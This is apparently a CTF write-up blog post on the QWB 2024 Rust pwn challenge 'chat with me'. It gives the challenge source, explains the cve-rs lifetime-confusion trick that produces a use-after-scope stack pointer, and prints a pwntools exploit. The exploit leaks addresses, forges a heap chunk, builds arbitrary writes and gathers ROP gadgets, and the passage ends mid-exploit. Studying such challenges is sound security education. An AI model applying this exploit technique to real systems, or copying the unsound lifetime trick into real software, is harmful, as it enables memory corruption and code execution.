    <link href="https://zjw1nd.github.io/2024/12/12/rust-pwn-qwb2024-chat-with-me/"/>
    <id>https://zjw1nd.github.io/2024/12/12/rust-pwn-qwb2024-chat-with-me/</id>
    <published>2024-12-12T08:14:22.000Z</published>
    <updated>2025-03-11T12:47:30.122Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>到手之后是一个扣了符号的rust程序，非常的恶心。</p><h1>最后看看出题人的分享</h1><blockquote><p><a href="https://bbs.kanxue.com/thread-284240.htm">https://bbs.kanxue.com/thread-284240.htm</a></p></blockquote><h2 id="源码：">源码：</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;<span class="keyword">self</span>, Read, Write&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> MAX_MSG_LEN: <span class="type">usize</span> = <span class="number">0x50</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    data: [<span class="type">u8</span>; MAX_MSG_LEN],</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        Msg &#123;</span><br><span class="line">            data: [<span class="number">0</span>; MAX_MSG_LEN],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">fmt</span>::Display <span class="keyword">for</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> fmt::Formatter) <span class="punctuation">-&gt;</span> fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;:?&#125;&quot;</span>, <span class="keyword">self</span>.data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">prompt</span>(msg: <span class="type">String</span>) &#123;</span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125; &gt; &quot;</span>, msg);</span><br><span class="line">    io::<span class="title function_ invoke__">stdout</span>().<span class="title function_ invoke__">flush</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ChatBox</span> &#123;</span><br><span class="line">    msg_list: <span class="type">Vec</span>&lt;&amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg&gt;,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">ChatBox</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        ChatBox &#123;</span><br><span class="line">            msg_list: <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>(),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">add_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Adding a new message&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">push</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">get_ptr</span>());</span><br><span class="line">        <span class="built_in">println!</span>(</span><br><span class="line">            <span class="string">&quot;Successfully added a new message with index: &#123;&#125;&quot;</span>,</span><br><span class="line">            <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">len</span>() - <span class="number">1</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">show_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Content: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.msg_list[index]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">edit_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Content&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">handle</span> = io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">lock</span>();</span><br><span class="line">        handle.<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>.msg_list[index].data).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Content: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.msg_list[index]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">delete_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">remove</span>(index);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">get_ptr</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg &#123;</span><br><span class="line">        <span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(_val_a: &amp;<span class="symbol">&#x27;a</span> &amp;<span class="symbol">&#x27;b</span> (), val_b: &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">                val_b</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">            <span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span> = Msg::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> msg)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">chat_box</span> = ChatBox::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;I am a chatting bot of QWB S8, you can chat with me.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;If you delight me, I will give you flag!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;This is function menu: &quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;2. show&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;3. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Choice&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">choice</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> choice).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">choice</span>: <span class="type">i8</span> = choice.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">match</span> choice &#123;</span><br><span class="line">            <span class="number">1</span> =&gt; chat_box.<span class="title function_ invoke__">add_msg</span>(),</span><br><span class="line">            <span class="number">2</span> =&gt; chat_box.<span class="title function_ invoke__">show_msg</span>(),</span><br><span class="line">            <span class="number">3</span> =&gt; chat_box.<span class="title function_ invoke__">edit_msg</span>(),</span><br><span class="line">            <span class="number">4</span> =&gt; chat_box.<span class="title function_ invoke__">delete_msg</span>(),</span><br><span class="line">            <span class="number">5</span> =&gt; <span class="keyword">break</span>,</span><br><span class="line">            _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Invalid Choice!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目漏洞点的核心在于这个poc函数，来自于<a href="https://github.com/Speykious/cve-rs">cve-rs</a>并在UIUCTF2024 Rusty Pointer中用过的：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_ptr</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg &#123;</span><br><span class="line">        <span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();<span class="comment">// 定义一个常量 S，它是一个指向空元组的引用的引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义一个泛型函数 get_ptr，接受一个可变引用 x，并返回一个不同生命周期的可变引用</span></span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">            <span class="comment">// 定义一个辅助函数 ident，接受两个参数：一个引用的引用和一个可变引用</span></span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(_val_a: &amp;<span class="symbol">&#x27;a</span> &amp;<span class="symbol">&#x27;b</span> (), val_b: &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">                val_b</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 定义一个函数指针 f，指向 ident 函数</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">            <span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span> = Msg::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> msg)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数的目的是“通过对变量静态生存周期的混淆，欺骗编译器不释放离开生存期的变量，从而获得一个离开生命周期后仍然可用的指针”，本题中vec里的那一个个栈上地址能够被使用就是因为这个函数。反正就是来回套娃，利用了一个骗过rust编译器生命周期的技巧来实现这一点。</p><p>原理这块先鸽了。</p><h2 id="exp：">exp：</h2><p>出题人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">author: GeekCmore</span></span><br><span class="line"><span class="string">time: 2024-10-30 17:06:06</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">filename = <span class="string">&quot;/home/geekcmore/Desktop/qwb/chat_with_me/attachments/pwn&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="number">6666</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *$rebase(0x1A979)</span></span><br><span class="line"><span class="string">b /home/geekcmore/RustroverProjects/chat-with-me/src/main.rs:145</span></span><br><span class="line"><span class="string">set debug-file-directory /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript=gs)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"> </span><br><span class="line">p = start()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content &gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tidy</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    y = p.recvline()[<span class="number">1</span>:-<span class="number">2</span>].decode().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    values = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            tmp += <span class="built_in">int</span>(y[i * <span class="number">8</span> + <span class="number">7</span> - j])</span><br><span class="line">            tmp &lt;&lt;= <span class="number">8</span></span><br><span class="line">        tmp &gt;&gt;= <span class="number">8</span></span><br><span class="line">        values.append(tmp)</span><br><span class="line">    info([<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> values])</span><br><span class="line">    <span class="keyword">return</span> values</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">addr_list = tidy()</span><br><span class="line">stack_addr = addr_list[<span class="number">4</span>]</span><br><span class="line">elf.address = addr_list[<span class="number">5</span>] - <span class="number">0x635B0</span></span><br><span class="line">heap_addr = addr_list[<span class="number">1</span>]</span><br><span class="line">success(<span class="string">f&quot;stack_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;elf_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(elf.address)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;heap_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br><span class="line">fake_heap = p64(<span class="number">1</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">1</span>) * <span class="number">2</span> + p64(heap_addr - <span class="number">0x2010</span>) + p64(<span class="number">0x1FE1</span>)</span><br><span class="line">edit(<span class="number">0</span>, fake_heap)</span><br><span class="line">tidy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add()</span><br><span class="line">info(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_qword</span>(<span class="params">addr, qword</span>):</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x51</span>) + p64(addr))</span><br><span class="line">    info(<span class="string">f&quot;Write <span class="subst">&#123;<span class="built_in">hex</span>(u64(qword))&#125;</span> to [<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>]&quot;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, qword)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_write</span>(<span class="params">addr, content</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), <span class="number">8</span>):</span><br><span class="line">        arb_qword(addr + i, content[i : i + <span class="number">8</span>])</span><br><span class="line"> </span><br><span class="line">ret_addr = stack_addr + <span class="number">0x3D0</span></span><br><span class="line">syscall = elf.address + <span class="number">0x0000000000026FCF</span></span><br><span class="line">pop_rdi_rbp = elf.address + <span class="number">0x000000000001DD45</span></span><br><span class="line">pop_rsi_rbp = elf.address + <span class="number">0x000000000001E032</span></span><br><span class="line">pop_rax = elf.address + <span class="number">0x0000000000016F3E</span></span><br><span class="line">pop_rdx_xor_ptrax = elf.address + <span class="number">0x0000000000045DC5</span></span><br><span class="line">sub_rdx_rcx_add_rax_rcx = elf.address + <span 